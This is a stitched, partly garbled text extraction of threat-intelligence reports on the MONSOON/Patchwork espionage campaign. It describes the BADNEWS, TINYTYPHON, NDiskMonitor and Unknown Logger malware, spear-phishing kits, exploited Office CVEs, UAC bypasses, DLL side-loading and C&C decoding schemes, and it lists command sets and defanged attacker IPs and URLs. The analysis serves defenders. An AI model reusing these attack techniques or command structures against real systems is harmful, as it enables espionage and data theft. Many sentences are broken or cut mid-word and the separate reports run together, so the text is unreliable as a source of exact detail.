Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 29 / 57 Keylogger . When BADNEWS first starts it will spawn a new thread to log keystrokes to a file. T he header of the file contains the marker \" KLTNM: \" and the system language. The rest of the file contains information about the active window and the keys pressed: KLTNM: 2016/06/01 09:42:18 - { Window Name } SHIFTcSHIFT; The malware will only send the keylog file to the C&C when instructed to by the \" kl \" command. Document Crawler . When BADNEWS first starts it will spawn a new thread to check all local & mapped drives for document files with the following extensions: doc docx pdf ppt pptx txt Any documents under 15MB will be copied to the user\\'s %temp% \\\\ SMB \\\\ folder. The malware will only send these documents to the C&C when instructed to by the \" ustr \" command. Window Message Processor . BADNEWS will also check for any new hard - drives that are added to the machine such as USB devices. It does this in an interesting way by creating a window and listening for the WM_DEVICECHANGE window message: LRESULT CALLBACK WndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam) { // Window message 23 is defined by the malware as a code to disable the document crawler if ( Msg > WM_QUERYENDSESSION ) { if ( Msg == WM_ENDSESSION ) return 23; // Has a new device been added to the machine?

A fully decompiled version of this AutoIt backdoor was generated by the Special Investi Document Exfiltration . T he AutoIt backdoor is capable of finding and uploading documents with the following extensions: *.doc;*.pdf;*.csv;*.ppt;*.docx;*.pst;*.xls;*.xlsx;*.pptx;*.jpeg These will then be uploaded to / update - request.php on the C&C. Figure 27 Upload via PHP Script Privilege Escalation . The backdoor will attempt to escalate privileges by bypassing Windows User Account Control (UAC) using one of two well - known techniques 13 : If the user\\'s operating system is 64 - bit then the malware will use the Windows Update Standalone Installer (WUSA) to copy its DLL into a protected folder ( C: \\\\ Windows \\\\ System32 \\\\ oobe ) with the name wdscore.dll . It will then execute oobe.exe which will side - load the malicious wdscore.dll instead of the one from the system directory. If the user is on a 32 - bit system then the malware will use the CallWindowProcW API to jump into some shellcode that will inject the UAC bypass executable into Svchost.exe . Firs tly, the legitimate Windows \" Computer Management.lnk \" file is overwritten with a new version using Leo Davidson\\'s IFi leOperation 14 code. This links to the original malware executable. Secondly, the malware will execute CompMgmtLauncher.exe which in turn wil l execute the copied shortcut as an elevated process. 13 https://www.pretent iousname.com/misc/win7_uac_whitelist2.html 14 https://msdn.microsoft.com/en - us/library/bb775771(VS.85).aspx Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 32 / 57 PowerShell Second Stage & Metasploit Meterpreter .

UNKNOWN LOGGER PUBLIC V 1.5 Unknown Logger is another malware component used in MONSOON. It is a publicly released, free backdoor . It is capable of credential theft from browsers, keylogging, taking screenshots, spreading itself laterally, and downloading second stage malware. In 2012, a user named \"The Unknown\" publicly released a free version of a credential stealing worm on hackforums. net  called \"Unknown Logger Public\" . The actors have been using version 1.5 of this malware in some of their weaponised documents. It is likely that they simply downloaded and built their own version from the publicly available version 1.5 on Hackforums. Unkn own Logger is dropped by at least two 15 of the weaponised documents analysed. Both of these documents exploit CVE - 2014 - 6352 . 15 SHA1: 824013c9d8b2aab1396c4a50579f8bd4bf80abdb SHA1: e27d3cfc9141f618c5a8c075e7d18af11a012710 Figure 33 Unknown Logger Server Configuration Panel Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 38 / 57 Figure 34 Unknown Logger Settings Panel Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 39 / 57 Unknown Logger\\'s main purpose is to record keystrokes and s teal usernames and passwords saved by browsers on the local machine. This information is then sent to a pre - defined FTP or SMTP server with a username and password specified by the actor when building the malware. It can also spread itself into RAR files, USB devices and network shares. Interestingly it does not have the ability for C&C communication. It cannot execute arbitrary commands or receive a command in dicating what it should do next.

The \" DownloadExecFileURL \" specifies a URL to grab an additional file from and execute it at runtime. A nalysis found that nregsrv2 . exe is the same AutoIt trojan dropped by many of the other weaponised documents used in this campaign. TINYTYPHON The TINYTYPHON malware is a small backdoor capable of finding and uploading documents on locally mapped drives and receiving secondary malware . It is dropped by at least one of the weaponised documents 17 used in the MONSOON campaign where it is embedded inside another executable. The majority of the code for TINYTYPHON is taken from the MyDoom worm and has been repurposed to find and exfiltrate documents. Configuration & Persistence . TINYTYPHON contains a small configuration appended to the end of the executable. In the sample analysed 18 this configuration was XORed with the hexadecimal value 0x90. 17 SHA1 : 9cdbb41f8 3854ea4827c83ad9809ed0210566fbc 18 SHA1: fcf8e5cf1 207fdfab9bcb0a4dc45ad188089655a Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 42 / 57 Fi gure 36 XOR 0x90 Data The configuration contains the C&C address and paths to use as well as a list of document extensions to check when crawling local drives. It also contains the filename to copy itself to in the local system32 directory, and the name of the persistence registry key to install itself under HKEY_LOCAL_MACHINE \\\\ Software \\\\ Microsoft \\\\ Windows \\\\ CurrentVersion \\\\ Run . Document Crawler . TINYTYPHON constantly searches for and uploads documents on the local machine. It will fir st search for any documents on the drive containing the operating system, and then it will search through all drive letters C through to Z.

Figure 38 Document Upload to C&C Victims . The TINYTYPHON C&C from the sample we analysed contained a / http directory which had an open directory listing: Figure 39 C&C Web Server /http listing Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 45 / 57 The / upload directory contain ed several folders relating to different victims: Figure 40 C &C Web Server /http/upload listing Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 46 / 57 Each of these folders contain ed the documents found and uploaded by TINYTYPHON on the victim\\'s machine. Figure 41 C &C Web Server /http/upload/<victim> listing The filenames begin with the MD5 hash of the file, then a dash, and then the original filename. There were thous ands of documents which had been exfiltrated to this C&C. After reviewing the filenames of documents from several of the victims, it appears as though most of the victims are involved with government agencies . Some of these documents contain highly sensiti ve information such as clearance documents, financial information, and technical specifications. During the investigation, the server stopped responding on June 8, 2016 and then came back online on July 5, 2016. It is unknown why this month long outage occ urred, although it could have been because the group knew that people were accessing the open directories and wanted to remain undetected . Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 47 / 57 ATTRIBUTION With respect to attribution, Forcepoint Security Labs focus on enabling the awareness and understanding o f intent. This is useful in order to identify likely future behaviour. Reports from Special Investigations do not focus on specific attribution. VICTIMS The MONSOON victims fit with a group who have military and political interests in the Indian Subcont inent . Many of the victims are located in surrounding countries including Bangladesh, Sri Lanka and Pakistan. But victims also originate from further afield, including Africa and the Far East. The targeting of Chinese nationals may also be related to this campaign , but equally may be part of a separate campaign by the adversary or even as part of them selling Surveillance - As - A - S ervice in a similar manner previously seen with the HANGOVER group 2 . A DVERSARIES It was possible to i dentify an individual from a domain registration record who is believed to be associated with MONSOON. There is a highly probable level of confidence in this association due to the following reasons: The domain name registered is a variant of one of the mo st popular domains used in MONSOON The person who registered the domain lives or has lived and works in India The person who registered the domain has profiles on coding challenge and freelance coder websites. The HANGOVER group are thought to use freelanc e coders. accounts. However, it is not deemed in the public interest to publish specific details on this individual. Relevant authorities are informed as an d when appropriate. Cui Bono? A useful analysis viewpoint is to ask the legal question: Cui Bono ? Or: w ho profits? Even though this report does not attempt to focus on specific attribution, asking hat is to be gained from these actions or what needs a may offers some insight. Any further analysis is left as an exercise to for reader. From the documents known to have been exfiltrated , a number of recurring themes occur : Army training, personnel and payroll records Defence attaches and co nsulates Defence research Foreign high commissions Military exercises Military air platforms Military naval platforms Military logistic records Naval coastal protection Anti - torpedo and naval electronic countermeasure (ECM) systems. Submarine communication systems Nuclear security and counter proliferation United Nations Personal details including medical records, d riving license, p assport and visas Accounting records Travel and itinerary details Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 48 / 57 INFRASTRUCTURE By integrating the findings with prior resear ch 1 8 , i t was possible to connect MONSOON directly with infrastructure used by the HANGOVER group via a series of strong connections. The original HANGOVER infrastructure overlaps with unique pa ssive DNS records and is further linked by the use of a specific SOA RNAME record. An example of this connection is illustrated below. Figure 42 Connection Topology Both of the IPs that link this infrastructure appear to be un ique to the Hangover group. The newsnstat. com  domain was used earlier in 2015 for previous HANGOVER campaigns, and was then repurposed in December 2015 for the MONSOON campaign.

Patchwork is known for rehashing off - the - rack tools and malware for its own campaigns. The group uses attack vectors that may not be groundbreaking what with other groups exploiting zero - days or cunningly adjusting their tactics but as its moniker entails, its repertoire of infection vectors and payloads still makes them a credible threat. in 2017 . The diversity of their methods is notable from the social engineering hooks, attack chains, and backdoors they deployed. They also included Dynamic Data Exchange (DDE) and Windows Script Component (SCT) abuse to their tactics , as n eye on other threats and security flaws to repurpose for their own ends . Also of note are its attempts to be more cautious and efficient in their operations. This technical brief provides deeper analyses of their campaigns from the infection vectors and social engineering to the infrastructure and malware they used. The indicators of compromise are in this appendix . Spear - phishing emails are their staple method for deliver ing malware. These socially engineered emails contain web links of weaponized documents containing exploits or macros. We found Patchwork using three variations of this method. Patchwork set up an English - language news site. The spoofed website looks exactly like the legitimate the addition of a small code snippet. It contains an additional meta tag at the end of the web page source code, The web page is not indexed in search engines. It can only be visited by clicking on the link contained in the spear - phishing email s, helping it evade traditional security mechanisms compared to directly sending the link to the malicious document. Figure 1: The added code snippet that redirect s its visitors to the malicio us document We also saw spear - phishing emails containing direct links to the weaponized documents hosted o n servers they own. The group employ s typosquatting t o increase clicks . T hese servers were reached through domain names similar to legi timate websites, such as rannd.org instead of rand.org. used as much, as the attachments can be detected by spam filters . The spear - phishing emails were sometimes sent to victims by misusing YMLP and serversecure.net, which are email/newsletter distribution services. Abusing these legitimate online services helps improve they op erate . The domain name to this server. It had a proper MX record, an SSL certificate issued by , and the domain property validated on Google . Recently, the TXT SPF1 record of domains servicelogin . center spam filters. The attackers also reporte dly used a fake Youku Tudou website (a video platform similar to YouTube very popular in China). It entices users to download a fake Adobe Flash player update, which turned out to be a variant of the xRAT malware. The group also employ s and other online services. Opening one of the suspicious domains , hxxps ://accounts  -  login  -  secure  .  163  .  com  .  neteease  .  com , in a web browser returns a web development company. was copied from a web development company A closer look reveals that the phishing kit expects a few parameters. The kit , which spoofs a legitimate web portal and email service, consists of t wo PHP files: main.php , which has the initial webpage; and error.php , which harvests and processes entered credentials. Figure 3: The PHP file that processes entered credentials main.php expects the following commands with base64 - encoded values ( seen on the screenshot above): u = user (encoded username , the victim cannot change it o n the web form) r = referrer ( hxxp ://mial  .  163  .  com was used as referrer ; the use of mial is noted ) d = domain (163 or 126 or yeah or shouji ) The domain has one of the four possible values: MTYz is 163 MTI2 is 126 eWVhaA== is yeah c2hvdWpp is shouji (which means mobile phone in Chinese) As of November 24, 2017, we found three different phishing websites using a valid SSL certificate issued The SSL certificates listed the following domain names: accounts  -  login  -  s ecure - 163  - com - neteease.com accounts  -  login  - secure - qq - com - neteease.com accounts  -  login  - vip - sina - com - neteease - com neteease  .  com accoun ts.login.yahoomail.support yahoomail . support accounts . login . googlemail . support Figure 4: Page information properties of one of the phishing websites The parameters sent to the error.php script that attackers collect are username, domain, password and redirector values. Figure 5: Parameters sent to the error.php script Given how the phishing kit works, the attackers seem cautious. The phishing page can only be obtained by sending specif ic arguments to the PHP script. Any other way will lead to the fake suspended account page. The link leading to the phishing page can only be found on the emails sent to the victims. Many of the documents were found i n a directory accidentally left open. The group use s s ociopolitical themes as social engineering hooks. Those with the .doc extension are actually Rich Text format (RTF) files that trigger an exploit for CVE - 2012 - 1856 , patched via MS12 - 060 last August 2012. It is a remote code execution (RCE) vulnerability in the Windows common control MSCOMCTL , an ActiveX Control module. These files drop variants of the NDiskMonitor backdoor. The PowerPoint Open XML Slide Show (PPSX) files exploit Sandworm ( CVE - 2014 - 4114 Object Linking and Embedding (OLE) feature patched last October 2014. Figure 6: The dir ectory containing the documents The PowerPoint (PPT) file exploit s CVE - 2017 - 0199 , an RCE vul the file will attempt to download an . HTA file and silently exploits it by leveraging CVE - 2017 - 0199 . Figure 7: The PPT containing the CVE - 2017 - 0199 exploit Figure 8: Code snapshot showing the PPT file downloading a malicious . HTA file We also saw another document that comes with an executable instead of a macro . The file decodes and executes a Visual Basic script (VBS) that drops and executes a hybrid batch/.NET file , which then downloads and executes the NDiskMonitor backdoor and a decoy document. The relatively long infection chain can be construed as their way to obscure their activities. A d ocument the group recently used had an additional step, likely done to avoid antivirus (AV) detection. A Word document embed ded with a malicious PPSX file urges the victim to click on a fake PDF icon to open the malicious document. It exploits CVE - 2017 - 8570 (an RCE vulnerability in Microsoft Office patched last July 2017) to download a Windows Script Component ( SCT ) file from a Patchwork - owned server. Figure 9 : Screenshot of t he Word document containing a PP SX file that exploits CVE - 2017 - 8570 Figure 10 : Code snippet showing the malicious SCT to be retrieved T he scriptlet . SCT file shown above contains PowerShell code. The payload downloads a malicious xRAT sample and a decoy PowerPoint presentation . It also recursively deletes Resiliency registry keys created by Microsoft Office applications (Word, Excel, PowerPoint, etc.). Some items in the Resiliency registry key are created when the Office application does not terminate correctly, later displayin g this information to the user. Deleting Resiliency keys will make the Office application think that everything was correct and there were no problems during the latest application run. The latest step involves starting PowerPoint, maximizing its window, a nd load ing a decoy document while starting the payload in the background. We also found other PPSX documents that exploited this vulnerability , but they were sent directly and not embedded in a DOCX file. We also uncovered documents related to the Banglade sh Army and a United Nations Development Programme in Sri Lanka. These documents contained malicious macros that deliver the xRAT remote access tool, which lets attackers control the infected machine. There were also other social ly engineered documents th at used government - related news and activities, with subjects as lures . These are RTF files exploiting CVE - 2015 - 1641 , a memory corruption vulnerability in Microsoft Office patched last April 2015. When executed, i t drops a signed java - rmi.exe executable from Java Runtime and two dynamic - link libraries (DLLs) a clean msvcr71.dll and maliciou s jli.dll . The malicious DLL, which contains the Badnews backdoor, is loaded and executed using the DLL side - loading technique . Figure 11 : S creen shots of RTF files that exploit CVE - 2015 - 1641 and deliver the Badnews backdoor We managed to acquire a few samples abusing a technique called s elf - compiled .NET hybrids . One text file contains both JavaScript code and batch code, which compiles the JavaScript code into executable files and later executes it. The file starts with two lines , shown below . The first line must be a valid statement in both languages. If executed as a batch script, the first comparison (@X)==(@Y) is evaluated as False . T herefore @end is not executed. E ach following line is then causes the batch processing to terminate . Figure 12 : Code snippet of samples us ing the self - compiled .NET hybrid JavaScript, however, treats terms starting with @ as conditional compilation variables , evaluated as Fa lse, followed by a multiline comment. JavaScript , therefore, ignores all the code between /* and */, and only the code that follows */ is considered . The compilation process is achieved by the following command, where %jsc% points to a JScript compiler and %~ dpsfnx0 is resolved to the name of the currently executed batch file (d means disc , p means path, f m eans file, x means extension ; all are modifiers of a special %0 parameter) . Figure 13 : Command that facilitates the compilation process The end of the batch script behind the */ comment is treated as source code. The code shown below makes a simple command - line downloader with two parameter s, URL, and file name. Figure 14 : Snapshot showing the command - line downloader After compilation, the batch script uses the previously compiled simpledownloader.exe to download and execute both the payload and decoy document. Figure 15 : Snapshot show ing the payload and decoy document being retrieved The scvhost6.exe file is actually a variant of the NDiskMonitor backdoor, while the document.doc is a decoy document, which is a legitimate sociopolitical essay. Patchwork also abused the Dynamic Data Exchange (DDE) protocol to deliver their malware. The internal structure of a s ample we analyzed, an Office Open XML file, is a ZIP archive that contains the xml The payload starts with a DDEAUTO string, followed by a command to be executed. The command can be split w:instrText through the use of other methods . In the figure below, the entire PowerShell command ( displayed in black ) is split into several chunks. When a victim opens the d ocument and DDE is enabled on the machine, the PowerShell command downloads and displays the decoy document then retrieves and executes xRAT. Figure 16 : PowerShell command retrieving and executing xRAT xRAT, renamed QuasarRAT in its latest versions, is a remote access tool whose source is publicly available on Github. This availability allows anyone to easily clone the project and compile it. The project is actively maintained , with users reporting bugs and the developer fixin g them and committing the repaired files back to the Github repository. NDiskMonitor is a custom backdoor written in .NET, named after the project name. backdoor used by any other threat actor, so we construe this as Patch Figure 17 configuration is stored in update_details global variable. 70600 is probably its b ackdoor ID, \" F uck You \" is the AES password used for encrypti ng certain information, and the string following it is the command and control (C&C) address. Figure 18 NDiskMonitor spawns a few threads. The first thread beaco ns regular ly to let attackers know that the machine is alive. The p arameter license is the encrypted username , current_license is the encrypted computer name, and bui is the backdoor ID. Figure 19 : Thread spawned by NDiskMonitor The second thread listens for backdoor commands. Backdoor queries are done via updatecheck.php , with parameters client as the encrypted user name. Supported commands are: cme - update|<base64 command> execute command, AES - encrypted result exfiltrated with /php/component_update.php , parameters component = user name and check = encrypted result D v return list of all logical drives, separated by & rr|<base64 directory> list all the files and directories in given directory ue|<base64 url> download and execute file from given URL The third thread regularly downloads and executes the Wintel file/in formation stealer , while t he fourth thread runs a custom Task Host program , which one on its own. Of note were multiple NDiskmonitor samples we found in the wild that had different hashes but similar c ode. The attackers added four extra bytes of random uppercase and lowercase letters after the PE - referenced data in the overlay. We think this is done solely to change the file hashes since the Windows PE loader won\\'t even load those extra bytes in to memor y. This backdoor, which has been used in other campaigns , has an interesting method for retrieving the actual C&C address. The binary has a few hardcoded and encoded URL addresses, which can b e decoded by subtracting 0x01 from each character. After the decoding, we get the actual URL s . Figure 20 : The hardcoded strings (above), and the actual URLs when decoded (below) These addresses refer to legitimate websites such as Github, Feed43, WebRSS, Wordpress, and Weebly, likely to circumvent AV detection. Accessing these decoded URLs reveals a long base64 string enclosed within parentheses. This may be hidden on some websites, as the text has white color on a white nt to Figure 2 1 : base64 string enclosed in the decoded URLs The text needs to be decoded on the actual C&C server. This can be done by base64 decoding, decodi ng Hex string to bytes, then XORing each byte with 0x23 and rotating left by three positions. The decoded C&C URL looks like the following: hxxp ://188  .  165  .  124  .  30/c6afebaa8acd80e7/byuehf8af  .  php Badnews will then start to communicate with the C& C server. The request is not sent in clear text form, but is encoded using the same algorithm used for encoding the C&C server name: uid=<14 hex digits >&u=<hex encoded Unicode username>&c=<hex encoded Unicode computer name>&v=2.2 The server response ma y include any of these 11 implemented commands: s hell d ownload and save file l ink download and write file , run with ShellExecute , inject into process if writing to file fails mod download and save DLL file; likely module upd download and save EXE file; lik ely update dwd create empty file and send it to C&C server; probably for testing purposes kl send logged keys to C&C server snp snap, take screenshot ustr upload stolen documents sdwl upload file to C&C server utop stop stealing files hcmd run cmd.exe as a shell Figure 2 2 : Badnews Depending on Badnews in a file, which, based on the received backdoor command, may be sent back to C& C server. The same goes for the file - stealing thread, which monitors USB devices and copies files with certain extensions to back to C&C server. This featu re is probably implemented to overcome air - gapped environments, as not all of its versions have a thread that steals data stored on USB devices . Badnews is usually compiled as a DLL loaded by a legitimate Java runtime executable, which is vulnerable to DLL hijacking. T he real Authenticode certificate is sometimes appended to the DLL to make it look more legitimate, but it is invalid. We recently saw a sample of it as an executable in the wild. ile stealer s are used to se arch for files with certain extensions , which are then uploaded to their C&C server. The stealers we found seem to be developed and used exclusively by Patchwork. Taskhost Stealer combines theft and persistence capabilities. It s written in .NET and obfuscated with Crypto Obfuscator, which can be removed with the de4dot tool. Figure 2 3 Taskhost Stealer has a constructor of a class, where the base.Load function is assigned an important function called RemoveResources . The IP address of C&C server is also assigned to a vari ab le named windowID . Note that function names relation to their actual function, e.g. , RemoveResources mean that it removes resources The fake names were prob ably made to confuse reverse engineers and researchers . Figure 2 4 : Code snapshot showing RemoveResources Within the RemoveResources function is a list of document extensions that are of interest to Patchwork , which are files commonly associated with cy berespionage. It also has a function that checks for the existence of a sys.bin file in %APPDATA \\\\ Roaming \\\\ Microsoft \\\\ taskhost \\\\ 1.0.0.0 \\\\ . This file contains a list of all documents with path s accessible from the infected machine. Figure 2 5 : Document extensions specified by Taskhost Stealer Then, it drops Microsoft.Win32.TaskScheduler.dll and adds persistence. The c ode snippe t below shows the name of the task (Active Qiho Security), as well as the time interval (5 minutes) and duration (60 d ays). It means that the process of looking for new files repeats every 5 minutes for the next 86 , 400 minutes (60 days) , based on the code and scheduled task exported to XML format. Figure 2 6 : Code snippet s showing how Task h ost Stealer looks for new files (above), which is also in the XML file exported from Task Scheduler (below) It then enumerates all the available drives and makes a POST request on C&C about the existence of these drives : Figure 27 : Available drives in the i nfected machine are enumerated The request contains parameters drive and student_name. drive s value is a dis k letter followed by information if it is a Fixed or Network drive . student_name contains computer name and username, separated by a hyphen. Files sys.bin. Figure 28 : POST request with the drive and student_name parameters (above) and files being enumerated (below) The next step is to read from hxxp ://209  .  58  .  185  .  35/LOG/< computer name> - <user name>  .  html . If the response is c121, the program ends. This lets attackers control which machines they do not want to receive files from . All files from the previously created list will be uploaded one by one . A list of u ploaded file s will be in s.dwg , while the list of all files is in sys.bin. During each run, sys.bin is deleted and newly created ; however, s.dwg remains the same . This ensures that only newly created files are uploaded . The upload path looks like this: drive (Fixed o r Network), followed by path , computer name , and username . Figure 29 : Code snippets showing the c121 response (top) and s.dwg (bottom) Wintel S tealer (Win Telephonic Services) is another .NET stealer named after the project name . Compared to the Taskhost S tealer, W intel Stealer targets different files types and has no persistence mechanism . The information of files are stored in the following format : filename whose path is AES - encrypted with a hardcoded password, then encoded with base64, with the & , SHA256 hash , and $ character appended. This structure is stored in a global variable and remains in memory. A timer is enabled , starting the upload process when an internet connection is available. Figure 30 configuration (left) and the file types it targets (right) Figure 31 : Information about the files is stored in a certain format The load_check.php script is first queried with the parameters user , which is base64 - encoded username , and hsh , which is file hash. The ?ussr= in the screenshot below is likely a typo ; it should be user and not ussr (Soviet Union). Figure 32 load_check.php script Que rying this script will tell whether the files are of interest and should be uploaded , and also ensures that the backend server up.php script is for uploading files, using parameters use for username, fl for bytes of the file , hs for the SHA256 . Older versions of file stealers were written in AutoIt , and e ach of these contains an endless loop. The f unction __searchindex searches drive C: \\\\ for certain file extensions. They will cop y the targeted files to a directory named index . I t also maintains a file Temp.log , each line of which c ontain ing a ex - encoded MD 5 hash . The f unction __sendoutlist uploads all the files from index directory to the C&C server and deletes them. Persistence is carried out by modifying the Run registry key. Figure 33 : The function s of the AutoIt stealers We found 30 to 40 IP addresses as well as domain names used by Patchwork in 2017. Each server has a different purpose. Some are only meant to be C&C servers that collect data sent by the file stealers, and no domain name poi nts to those IP addresses. In some cases , the same server is used for C&C communication while also acting as a website hosting content copied from legitimate websites and propagating malware or weaponized documents. They misuse publicly available PHP scri pts to retrieve files from the server without disclosing their real for deter ring researchers from finding open directories. The documents are almost always downloaded from the / xinwen dire ctory , which is now properly configured and cannot be browsed . On multiple occasions, we observed them temporarily removing the file so it could not be retrieved. Sometimes they replaced it with a legitimate file to dupe researchers. In some of their serve researchers in to thinking the files are gone. Other servers are used only to host phishing websites. Content change s between each campaign, but the same server remains . For instance, the qzon ecn.com domain has been pointing to the same IP address since January 2017, but it now points to yahoomail.support. It references euuwebmail.com for four months, and then militaryreviews.net for a week . This is consistent with the three months of v similar to legitimate websites that require authentication. We also found one server that was not hosting any content but had a Postfix instance running and being used to send targeted emails. All of these servers seem to use Apache on CentOS. The favicon on a server they recently used was still similar to his package to facilitate server installation when using a Windows environment. The domain names are always registered using a service protecting the related whois information, which were disclosed in 20 16. Additionally, many of the domain names published in previous reports have been either sinkholed by security companies or abandoned by the attackers. and malware.

Patchwork threat actors utilized a pair of EPS exploits rolled into legitimate, albeit malicious, documents in order to propagate their updated BADNEWS payload. The use of weaponized legitimate documents is a longstanding operational standard of this group.\\nThe malicious documents seen in recent activity refer to a number of topics, including recent military promotions within the Pakistan Army, information related to the Pakistan Atomic Energy Commission, as well as Pakistan’s Ministry of the Interior.\\nThe BADNEWS malware payload, which these malicious documents ultimately deliver, has been updated since the last public report in December 2017. BADNEWS acts as a backdoor for the attackers, providing them with full control over the victim machine. It has historically leveraged legitimate third-party websites to host the malware’s command and control (C2) information, acting as “dead drops”. After the C2 information has been collected, BADNEWS leverages HTTP for communication with the remote servers.\\nWe’ve observed modifications to how the malware obtains its (C2) server information, as well as modifications to the C2 communication. These changes to BADNEWS, as well as the use of recent EPS-based exploits, demonstrate that the group are actively updating their toolsets in efforts to stay ahead of the security community.\\nIn this posting, we detail our findings and document these changes.\\nDelivery\\nThe malicious documents that Unit 42 examined contained legitimate decoy lures as well as malicious embedded EPS files targeting the CVE-2015-2545 and CVE-2017-0261 vulnerabilities. These vulnerabilities are well covered in previous public works, which can be found from PWC and FireEye. Older documents used by Patchwork focused on the CVE-2017-0261 vulnerability, however in late January 2018 when, paradoxically, newer documents abandoned this vulnerability to attack the older CVE-2015-2545 vulnerability.\\nThe lures are primarily documents of interest to Pakistani nuclear organizations and the Pakistani military as can be seen in the images below:\\nFigure 1 Lure extracted from a67220bcf289af6a99a9760c05d197d09502c2119f62762f78523aa7cbc96ef1\\nFigure 2 Lure extracted from 07d5509988b1aa6f8d5203bc4b75e6d7be6acf5055831cc961a51d3e921f96bd\\nFigure 3 Lure extracted from b8abf94017b159f8c1f0746dca24b4eeaf7e27d2ffa83ca053a87deb7560a571\\nFigure 4 Lure extracted from d486ed118a425d902044fb7a84267e92b49169c24051ee9de41327ee5e6ac7c2 and fd8394b2ff9cd00380dc2b5a870e15183f1dc3bd82ca6ee58f055b44074c7fd4\\nThe payload from each of the malicious documents is an updated version of the BADNEWS malware family. When the shellcode embedded within the malicious EPS is executed, the following three files are dropped:\\n%PROGRAMDATA%\\\\Microsoft\\\\DeviceSync\\\\VMwareCplLauncher.exe\\n%PROGRAMDATA%\\\\Microsoft\\\\DeviceSync\\\\vmtools.dll\\n%PROGRAMDATA%\\\\Microsoft\\\\DeviceSync\\\\MSBuild.exe\\nIn the list of dropped files, VMwareCplLauncher.exe is a legitimate, signed VMware executable that serves to ultimately deliver the BADNEWS payload. The vmtools.dll file is a modified DLL that both ensures persistence and loads MSBuild.exe, which is the BADNEWS malware renamed to spoof a legitimate Microsoft Visual Studio tool.\\nAfter the files are dropped, the VMwareCplLauncher.exe executable is run, which in turn loads the vmtools.dll DLL file. This DLL file creates a scheduled task named BaiduUpdateTask1, which attempts to run the malicious, spoofed MSBuild.exe every subsequent minute.\\nThe technique of having a signed, legitimate, executable load a malicious library is commonly referred to as side-loading, and has been witnessed in a number of campaigns and malware families in the past.\\nThe flow of execution from the time the victim opens the malicious Microsoft Word document, to the execution of BADNEWS, may be seen below:\\nFigure 5 Side-loading technique employed to deliver BADNEWS\\nThe following image demonstrates the scheduled task created by the modified vmtools.dll to ensure BADNEWS runs and remains running on the victim machine.\\nFigure 6 Scheduled task created to load BADNEWS\\nBADNEWS\\nMuch of BADNEWS has remained consistent from when it was originally discussed by Forcepoint in August 2016. Additionally, recent analysis by Trend Micro notes some minor changes during 2017. To briefly recap, the BADNEWS malware family acts as a backdoor, with communication occurring over HTTP. A number of commands are provided to the attackers, including the ability to download and execute additional information, upload documents of interest, and take screenshots of the desktop.\\nThe malware collects C2 information when it is originally executed via “Dead Drop Resolvers”. Dead drop resolvers have been used by multiple threat actor groups using various malware families and those behind Patchwork are well versed with this tactic. This tactic uses public web services to host content that contains encoded commands that are decoded by the malware.\\nFor the remainder of the analysis in this research blog, we are discussing the following file:\\nSHA256\\n290ac98de80154705794e96d0c6d657c948b7dff7abf25ea817585e4c923adb2\\nMD5\\n79ad2084b057847ce2ec2e48fda64073\\nCompile Date\\n2017-12-22 11:54:03 UTC\\nOne of the first modifications we witnessed in this new variant of BADNEWS is a new mutex that is created to ensure a single instance of BADNEWS is running at a given moment. This malware family used the new mutex ‘com_mycompany_apps_appname_new’.\\nThis variant of BADNEWS uses different filenames compared to previous versions. The following filenames are used by BADNEWS throughout its execution. All of these files reside in the victim’s %TEMP% directory:\\nFilename\\nDescription\\n9PT568.dat\\nContains victim unique identifier\\nTPX498.dat\\nKeystroke logs\\nedg499.dat\\nList of interesting files\\nTPX499.dat\\nTemporarily holds screenshot when given command by C2\\nup\\nTemporarily contains downloaded file to be executed when given command by C2\\nOther changes we noticed in this variant include how the malware obfuscates C2 information stored via dead drop resolvers. Previous variants of BADNEWS looked for data between ‘{{‘ and ‘}}’, and used a simple cipher to decode this data. This new variant now looks for data between ‘‘ and ‘’ in a number of hardcoded URLs. This can be seen in the following images taken from hxxp:// feeds.rapidfeeds.com/88604/, which is one of the dead drop resolvers we encountered in this sample:\\nFigure 7 Dead drop resolver used by BADNEWS\\nIn order to decrypt this data, the authors have included additional steps from previous versions. To decode this information, BADNEWS takes the following steps:\\nBase64-decode the string\\nPerform the decoding cipher used in previous versions\\nBase64-decode the result\\nDecrypt the result using the Blowfish algorithm and a static key\\nA script, which is included in the Appendix, will decrypt data from these dead drop resolvers. In the example shown above, we are presented with a result of 185.203.118.115 after all four steps are taken.\\nBADNEWS performs many of the expected functions associated with previous versions including keylogging and identifying files of interest. Unlike a previously reported variant, this version of BADNEWS no longer looks at USB drives for interesting files. Instead, it looks at fixed drives only. It continues to seek out files with the following extensions:\\n.xls\\n.xlsx\\n.doc\\n.docx\\n.ppt\\n.pptx\\n.pdf\\nIn order to prepare for C2 communication, BADNEWS will aggregate various victim information, which is appended to two strings. These strings have the following format:\\nuuid=Victim ID#un=Username#cn=Hostname#on=OS Version#lan=IP Address#nop=#ver=1.0\\n1\\nuuid=Victim ID#un=Username#cn=Hostname#on=OS Version#lan=IP Address#nop=#ver=1.0\\nuuid=Victim ID#un=Username#\\n1\\nuuid=Victim ID#un=Username#\\nAn example of the first string may be seen below:\\nuuid=e29ac6c0-7037-11de-816d-806e6f6e696351c5#un=Josh Grunzweig#cn=WIN-LJLV2NKIOKP#on=mav6miv1#lan=192.168.217.141#nop=#ver=1.0\\n1\\nuuid=e29ac6c0-7037-11de-816d-806e6f6e696351c5#un=Josh Grunzweig#cn=WIN-LJLV2NKIOKP#on=mav6miv1#lan=192.168.217.141#nop=#ver=1.0\\nIt should be noted that the variables used 